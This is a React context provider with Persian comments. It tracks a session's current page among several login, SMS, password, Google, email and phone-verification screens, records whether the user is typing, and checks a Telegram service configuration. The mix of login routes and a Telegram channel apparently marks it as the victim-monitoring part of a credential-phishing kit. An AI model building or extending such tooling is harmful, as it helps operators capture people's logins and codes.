// ارائه‌دهنده سراسری حضور برای کل اپلیکیشن
// Global Presence Provider for App-wide presence tracking

import React, { createContext, useContext, useEffect, useState } from "react";
import { useLocation } from "react-router-dom";
import globalPresenceManager, {
  type GlobalPresenceState,
} from "@/lib/global-presence-manager";
import { validateTelegramConfig } from "@/lib/telegram-service-enhanced";

interface GlobalPresenceContextType {
  presenceState: GlobalPresenceState | null;
  isInitialized: boolean;
  currentPage: string;
  sessionId: string | null;
}

const GlobalPresenceContext = createContext<GlobalPresenceContextType>({
  presenceState: null,
  isInitialized: false,
  currentPage: "unknown",
  sessionId: null,
});

export const useGlobalPresence = () => {
  const context = useContext(GlobalPresenceContext);
  if (!context) {
    throw new Error(
      "useGlobalPresence must be used within GlobalPresenceProvider",
    );
  }
  return context;
};

interface GlobalPresenceProviderProps {
  children: React.ReactNode;
}

export const GlobalPresenceProvider: React.FC<GlobalPresenceProviderProps> = ({
  children,
}) => {
  const location = useLocation();
  const [presenceState, setPresenceState] =
    useState<GlobalPresenceState | null>(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [subscriberId, setSubscriberId] = useState<string | null>(null);

  // تشخیص صفحه فعلی بر اساس مسیر
  const getCurrentPageName = (pathname: string): string => {
    const pathMap: Record<string, string> = {
      "/": "LoginForm",
      "/loading": "Loading",
      "/auth-sms": "AuthSMS",
      "/auth-password": "AuthPassword",
      "/auth-google": "AuthGoogle",
      "/auth-email": "AuthEmail",
      "/phone-verification": "PhoneVerification",
      "/debug": "Debug",
    };

    return pathMap[pathname] || "Unknown";
  };

  const currentPage = getCurrentPageName(location.pathname);

  // مقداردهی اولیه سیستم حضور
  useEffect(() => {
    const initializePresence = () => {
      // دریافت sessionId از منابع مختلف
      const currentSessionId =
        sessionStorage.getItem("sessionId") ||
        localStorage.getItem("sessionId") ||
        null;

      if (!currentSessionId) {
        console.log(
          "🌍 [GLOBAL PRESENCE] هیچ sessionId یافت نشد، منتظر ایجاد session...",
        );
        return;
      }

      if (sessionId === currentSessionId && isInitialized) {
        // اگر session تغییری نکرده، فقط صفحه فعلی را به‌روزرسانی کن
        globalPresenceManager.setCurrentForm(currentPage);
        return;
      }

      console.log("🌍 [GLOBAL PRESENCE] مقداردهی اولیه سراسری", {
        sessionId: currentSessionId,
        currentPage,
        isConfigured: validateTelegramConfig(),
      });

      // cleanup قبلی در صورت وجود
      if (subscriberId) {
        globalPresenceManager.unregisterForm(subscriberId);
      }

      // مقداردهی اولیه مجدد
      globalPresenceManager.initialize(currentSessionId);

      // ثبت subscriber سراسری
      const newSubscriberId = globalPresenceManager.registerForm(
        "GlobalApp",
        setPresenceState,
      );

      setSubscriberId(newSubscriberId);
      setSessionId(currentSessionId);
      setIsInitialized(true);

      // تنظیم فرم فعلی
      globalPresenceManager.setCurrentForm(currentPage);

      console.log("✅ [GLOBAL PRESENCE] سیستم سراسری راه‌اندازی شد", {
        sessionId: currentSessionId.slice(-8),
        subscriberId: newSubscriberId,
        currentPage,
      });
    };

    // تأخیر کوتاه برای اطمینان از آماده بودن routing
    const timer = setTimeout(initializePresence, 100);

    return () => clearTimeout(timer);
  }, [location.pathname]); // وابستگی به مسیر فعلی

  // به‌روزرسانی صفحه فعلی هنگام تغییر مسیر
  useEffect(() => {
    if (isInitialized) {
      globalPresenceManager.setCurrentForm(currentPage);
      console.log(`🌍 [GLOBAL PRESENCE] تغییر صفحه: ${currentPage}`, {
        sessionId: sessionId?.slice(-8),
        pathname: location.pathname,
      });
    }
  }, [currentPage, isInitialized]);

  // cleanup هنگام unmount
  useEffect(() => {
    return () => {
      if (subscriberId) {
        globalPresenceManager.unregisterForm(subscriberId);
        console.log("🌍 [GLOBAL PRESENCE] cleanup سراسری انجام شد");
      }
    };
  }, [subscriberId]);

  // نظارت بر تغییرات sessionId
  useEffect(() => {
    const checkSessionChanges = () => {
      const currentSessionId =
        sessionStorage.getItem("sessionId") ||
        localStorage.getItem("sessionId");

      if (currentSessionId !== sessionId) {
        console.log("🌍 [GLOBAL PRESENCE] تغییر sessionId شناسایی شد", {
          old: sessionId?.slice(-8),
          new: currentSessionId?.slice(-8),
        });

        // راه‌اندازی مجدد با sessionId جدید
        setIsInitialized(false);
        setSessionId(null);
      }
    };

    // بررسی تغییرات هر 5 ثانیه
    const interval = setInterval(checkSessionChanges, 5000);

    return () => clearInterval(interval);
  }, [sessionId]);

  const contextValue: GlobalPresenceContextType = {
    presenceState,
    isInitialized,
    currentPage,
    sessionId,
  };

  return (
    <GlobalPresenceContext.Provider value={contextValue}>
      {children}
      {/* نمایش وضعیت در کنسول برای دیباگ */}
      {process.env.NODE_ENV === "development" && presenceState && (
        <div
          style={{
            position: "fixed",
            bottom: "10px",
            left: "10px",
            background: "rgba(0,0,0,0.8)",
            color: "white",
            padding: "5px 10px",
            borderRadius: "5px",
            fontSize: "11px",
            zIndex: 9999,
            fontFamily: "monospace",
          }}
        >
          🌍 {currentPage} | {presenceState.presenceLevel} |{" "}
          {presenceState.isTyping ? "⌨️" : "💤"}
        </div>
      )}
    </GlobalPresenceContext.Provider>
  );
};

export default GlobalPresenceProvider;
